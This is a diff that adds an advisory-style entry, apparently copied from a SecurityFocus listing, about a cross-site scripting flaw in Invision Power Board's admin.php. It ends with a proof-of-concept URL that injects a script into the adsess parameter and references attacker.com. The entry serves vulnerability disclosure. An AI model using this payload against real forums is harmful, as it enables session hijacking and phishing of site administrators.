@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/8381/info
+
+Invision Power Board admin.php script reported prone to a cross-site scripting vulnerability.
+
+The issue presents itself due to a lack of sufficient sanitization performed by functions in an Invision Power Board script on user-influenced URI parameters. It has been reported that a remote attacker may construct a malicious link to the affected script hosted on a remote site, and supply arbitrary HTML code as a value for a URI parameter. If this link is followed, the content of the URI parameter will be rendered in the browser of the user who followed the link.
+
+http://www.example.com/admin.php?adsess='><script>window.open
+(window.location.search.substring
+(78));</script><http://www.attacker.com?BoyBear$$$From$$$BinaryVision
